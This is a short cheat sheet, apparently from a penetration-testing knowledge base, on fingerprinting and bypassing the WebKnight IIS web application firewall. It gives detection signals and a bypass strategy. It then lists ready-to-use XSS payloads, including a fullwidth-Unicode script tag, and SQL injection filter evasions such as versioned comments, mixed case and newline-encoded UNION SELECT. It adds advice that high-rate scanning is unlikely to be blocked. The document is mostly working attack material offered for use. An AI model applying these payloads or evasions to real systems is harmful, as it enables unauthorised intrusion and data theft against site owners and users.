# WebKnight (AQTRONIX — IIS WAF)

### Detection Signals
| Signal | Where |
|--------|-------|
| `WebKnight` in Server/Via header | Response header |
| Block page: "WebKnight Application Firewall Alert" | 403 response body |
| Block page: "AQTRONIX WebKnight" | Response body reference |
| Response code: `999 No Hacking` | Custom HTTP status |
| Response code: `404 Hack Not Found` | Custom HTTP status — UNIQUE fingerprint |

### Bypass Strategy
- **Recommended tool**: curl/Burp. WebKnight is IIS-specific, legacy, rarely updated.
- **Key weakness**: Very old product. Pattern matching is basic. Most modern bypass techniques work.
- **IIS + WebKnight**: Often found with IIS shortname vulnerability → chain with `shortscan`.
- **Custom status codes**: `999` and custom `404` messages are dead giveaways.

### XSS Bypass
```
# WebKnight: basic regex matching, easy to bypass
<img/src=x onerror=alert(1)>
<svg/onload=alert`1`>
<details/open/ontoggle=alert(1)>

# Unicode bypass (WebKnight doesn't normalize Unicode):
＜script＞alert(1)＜/script＞
```

### SQLi Bypass
```
# WebKnight: blocks UNION, SELECT, OR, AND as keywords
# Easy bypasses:
' /*!UNION*/ /*!SELECT*/ 1,2,3--
' uNiOn SeLeCt 1,2,3--
'%0a%0aUNION%0a%0aSELECT%0a1,2,3--
```

### Rate Limiting
- Minimal. WebKnight is primarily signature-based.
- Automated scanning generally safe (high rate OK).
- Block response: custom 999 status.

---

